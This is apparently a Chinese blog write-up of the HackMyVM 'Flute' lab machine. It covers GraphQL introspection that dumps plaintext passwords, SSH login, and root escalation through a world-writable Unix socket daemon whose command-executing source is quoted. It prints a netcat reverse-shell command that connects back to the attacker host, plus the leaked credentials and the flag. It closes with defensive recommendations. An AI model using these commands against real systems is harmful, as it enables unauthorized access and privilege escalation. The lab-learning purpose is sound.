---
title: HackMyVM-Flute
date: "2026-04-03T21:24:24+08:00"
description: 用于完善渗透知识储备，从部署VM到获取flag。
categories: [渗透, "2026"]
tags: [HackMyVM, 渗透]

---

# HackMyVM-Flute

半人工题解，用于完善知识储备（基本跟着 AI 做的，自己写的题解只有操作没有原因和知识点，这里都补充上了）

其他人的题解：[[CSDN\]HackMyVM: Flute 靶机渗透题解	](https://blog.csdn.net/2301_79518550/article/details/159694683)​[[bilibili\]hackmyvm 靶机 Flute 复盘	](https://www.bilibili.com/video/BV16kXrBJEXn/?vd_source=545c6624e3574b1b30cee21595d8057e)​[[blog\]HMV-Flute](https://drume2-github-io.vercel.app/posts/481ece24.html)

### 如何部署

下好，然后去 virtualbox 导入一下。

![](/assets/img/media/2026_4_3/image-20260403212009-wguep5c.png)

打开设置改成这个。vmware 对应的也要改。

![](/assets/img/media/2026_4_3/image-20260403212104-c9fkgdg.png)

用管理员身份修改一下

![](/assets/img/media/2026_4_3/image-20260403212132-7u9tgpg.png)

然后把用到的虚拟机也改一下

![](/assets/img/media/2026_4_3/image-20260403212206-860pih1.png)

## Flute 靶机渗透完整题解（含知识点）

本文档记录 HackMyVM 靶机 **Flute** 的渗透过程，从主机发现到获取 root flag，并补充每一步涉及的关键知识点和操作方法。

---

### 环境说明

- 攻击机：Kali Linux（IP：`192.168.56.101`）
- 靶机：Flute（IP：`192.168.56.102`）
- 网络：VirtualBox Host-Only（`192.168.56.0/24`）

---

## 1. 主机发现

使用 `arp-scan`​ 或 `nmap` 扫描同网段存活主机。

```bash
sudo arp-scan -l
# 或
sudo nmap -sn 192.168.56.0/24
```

![](/assets/img/media/2026_4_3/image-20260403205535-e1p46ww.png)

**结果**：发现 `192.168.56.102`​（MAC 地址 `08:00:27:95:F5:4F`，Oracle VirtualBox 虚拟网卡）。

> **知识点**：`arp-scan`​ 发送 ARP 请求，比 ICMP 更可靠（防火墙常放行 ARP）。`nmap -sn` 默认发送 ICMP echo 和 TCP SYN 到 443/80。

---

## 2. 端口扫描与服务识别

对靶机进行全端口扫描：

```bash
sudo nmap -sV 192.168.56.102
```

![](/assets/img/media/2026_4_3/image-20260403205706-dpuhs6z.png)

**结果**：

- ​`22/tcp` → SSH（OpenSSH 10.0）
- ​`8888/tcp` → 未知服务（后确认为 GraphQL）

> **知识点**：`-sS`​ 为 SYN 半开扫描，速度快；`-sV`​ 探测服务版本；`-p-` 扫描所有 65535 端口。

---

## 3. 识别 GraphQL 端点

访问看不到什么，因为我没让虚拟机连外网。

![](/assets/img/media/2026_4_3/image-20260403205808-fe2tfcr.png)

其他连了的长这样，直接就有提示了。

![](/assets/img/media/2026_4_3/image-20260403213257-f800c00.png)

进行 `curl -v http://192.168.56.102:8888/`

![](/assets/img/media/2026_4_3/image-20260403210113-7760iel.png)

访问 `http://192.168.56.102:8888/`​ 返回 `400 Bad Request`​，消息 `GET query missing.`​。这是 **Apollo Server**（GraphQL 服务端）的典型响应。

尝试 POST 请求到 `/graphql`：

```bash
curl -X POST http://192.168.56.102:8888/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}'
```

![](/assets/img/media/2026_4_3/image-20260403210535-bu5o925.png)

返回 `{"data":{"__typename":"Query"}}`，确认该端点为 GraphQL API。

> **知识点**：
>
> - GraphQL 是一种 API 查询语言，允许客户端精确请求所需数据。
> - ​`__typename`​ 是 GraphQL 内省字段，返回当前对象的类型名称。`Query` 表示根查询类型。
> - Apollo Server 默认端点通常为 `/graphql`，也接受根路径（但本例中根路径返回 400）。

---

## 4. GraphQL 内省与数据提取

GraphQL 支持 **内省（Introspection）** ，即查询 API 自身的结构。发送内省查询获取所有可用字段：

```bash
curl -X POST http://192.168.56.102:8888/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name } } } }"}'
```

**输出**：

![](/assets/img/media/2026_4_3/image-20260403210727-pmbzq1r.png)

```json
{"data":{"__schema":{"queryType":{"fields":[{"name":"users"},{"name":"user"}]}}}}
```

发现两个查询字段：

- ​`users`：无参数，返回所有用户。
- ​`user`​：需要 `username` 参数，返回单个用户。

进一步查询 `users`​ 的具体字段（需猜测或继续内省，但此处直接尝试常见字段 `username`​ 和 `password`）：

```bash
curl -X POST http://192.168.56.102:8888/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { username password } }"}'
```

**输出**：

![](/assets/img/media/2026_4_3/image-20260403210851-j1foeom.png)

```json
{"data":{"users":[{"username":"admin","password":"imtherealadmin"},{"username":"hamelin","password":"comewithmerats"}]}}
```

成功获取两个用户的明文密码。

> **知识点**：
>
> - GraphQL 内省是默认开启的（生产环境应禁用），攻击者可借此枚举 API 结构。
> - 若内省关闭，可使用字段爆破工具如 `Clairvoyance`​ 或 `GraphQLmap`。
> - 本例中密码明文存储是严重的安全漏洞。

---

## 5. SSH 登录

尝试使用获取的凭证登录 SSH：

![](/assets/img/media/2026_4_3/image-20260403211002-im5lnx9.png)

```bash
ssh hamelin@192.168.56.102
# 密码：comewithmerats
```

成功登录，得到 `hamelin` 用户 shell。

> **注意**：`admin`​ 用户不存在（可能是 GraphQL 中定义的虚拟用户），只能登录 `hamelin`。

---

## 6. 系统枚举与提权

### 6.1 基本信息收集

```bash
id
# uid=1000(hamelin) gid=1000(hamelin) groups=1000(hamelin)

uname -a
# Linux flute 6.12.79-0-lts #1-Alpine SMP ... x86_64 Linux

cat /etc/os-release
# NAME="Alpine Linux"
# Alpine 使用 `doas` 而非 `sudo`
```

### 6.2 查找以 root 运行的进程

```bash
ps aux | grep root
```

![](/assets/img/media/2026_4_3/image-20260403211208-761ehl5.png)

发现两个有趣进程：

- ​`/usr/bin/node /home/hamelin/index.js`（GraphQL 服务）
- ​`/usr/bin/python3 /opt/ratd/ratd.py`（以 root 运行）
- 其实上面用户的密码 `comewithmerats` ​提示和 rats 有关系

### 6.3 分析可疑服务

查看 `/opt/ratd/ratd.py`：

```bash
cat /opt/ratd/ratd.py
```

![](/assets/img/media/2026_4_3/image-20260403211250-mr5ypvr.png)

代码内容：

```python
import socket
import os

sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
socket_path = "/tmp/ratd.sock"

if os.path.exists(socket_path):
    os.remove(socket_path)

sock.bind(socket_path)
os.chmod(socket_path, 0o777)
sock.listen(1)

print("Rat daemon running...")

while True:
    conn, _ = sock.accept()
    data = conn.recv(1024).decode()

    if data.startswith("RUN "):
        cmd = data[4:]
        os.system(cmd)   
        conn.send(b"OK\n")
    else:
        conn.send(b"Unknown command\n")

    conn.close()
```

**分析**：

- 这是一个 **Unix 域套接字** 服务，监听 `/tmp/ratd.sock`。
- 任何用户（因为 `chmod 777`）都可以连接该 socket。
- 发送以 `RUN `​ 开头的命令，服务会以 root 身份执行 `os.system(cmd)`。
- 这提供了一个完美的提权途径。

> **知识点**：
>
> - Unix 域套接字用于同一主机上的进程间通信，通过文件系统路径标识。
> - 权限 `0o777` 意味着任何用户可读写，存在安全风险。
> - ​`os.system(cmd)` 直接拼接命令，无过滤，可执行任意系统命令。

---

## 7. 利用 ratd 服务提权

### 7.1 检查 socket 是否存在

```bash
ls -l /tmp/ratd.sock
# srwxrwxrwx 1 root root 0 ... /tmp/ratd.sock
```

### 7.2 反弹 root shell

在 Kali 上开启监听：

```bash
nc -lvnp 4444
```

在靶机上执行（注意：靶机 `nc`​ 可能不支持 `-U`​，此处使用 `echo`​ 通过管道连接，但实际 `nc -U`​ 可能报错。~~改用 Python 更稳妥~~   个蛋，不行的）

**如果** **​`nc`​**​ **支持**  **​`-U`​**

![](/assets/img/media/2026_4_3/image-20260403211441-5lqg34y.png)

```bash
echo -n 'RUN busybox nc 192.168.56.101 4444 -e sh' | nc -U /tmp/ratd.sock
```

执行后，Kali 监听窗口获得一个 root shell。

> **为什么** **​`nc -U`​**​ **可能失败**：Alpine 自带的 `busybox nc` 可能未编译 Unix socket 支持，此时必须用 Python 或 socat。

---

## 8. 获取 Flag

在反弹的 root shell 中执行：

先 ls 看看有啥，这个 `root.txt` ​很可疑。

![](/assets/img/media/2026_4_3/image-20260403211531-29yxlvr.png)

```bash
find / -name "*flag*" -type f 2>/dev/null
# AI扯淡，屁也找不到的

cat root.txt
# HMVrootoepsamqu0liphzzsc7x9
```

**Flag**: `HMVrootoepsamqu0liphzzsc7x9`

---

## 9. 补充知识点总结

| 阶段         | 关键技术                                   | 说明                                       |
| ------------ | ------------------------------------------ | ------------------------------------------ |
| 主机发现     | ARP 扫描 (`arp-scan`​, `nmap -sn`)         | 同一广播域内最快发现                       |
| 端口扫描     | ​`nmap -sS -sV -p-`                        | SYN 扫描 + 服务版本探测                    |
| 服务识别     | 错误消息特征、端点试探                     | ​`GET query missing` → Apollo Server       |
| GraphQL 交互 | POST JSON 到 `/graphql`                    | 标准 GraphQL 请求格式                      |
| GraphQL 内省 | 查询 `__schema`                            | 枚举 API 所有字段                          |
| 数据提取     | 构造查询 `{ users { username password } }` | 获取明文凭证                               |
| SSH 登录     | 使用发现的密码                             | 验证凭证有效性                             |
| 权限提升     | Unix socket 命令注入                       | 通过 `ratd.py` 以 root 执行任意命令        |
| 反弹 shell   | ​`nc -e` 或 Python socket                  | 获取交互式 root 权限                       |
| 夺旗         | ​`find` 查找 flag 文件                     | 常见存放位置：`/root`​、`/`​、`/home/user` |

---

## 10. 预防措施（防御视角）

- **GraphQL**：生产环境禁用内省；使用身份验证和授权；避免返回明文密码。
- **Unix socket**：限制 socket 权限（如 `0660`），仅允许特定用户组访问。
- **命令执行**：避免使用 `os.system`，改用参数化调用；严格校验输入。
- **权限分离**：以低权限运行服务，即使被利用也限制损失。
- **日志监控**：检测异常的 socket 连接或命令执行。

---

‍

#
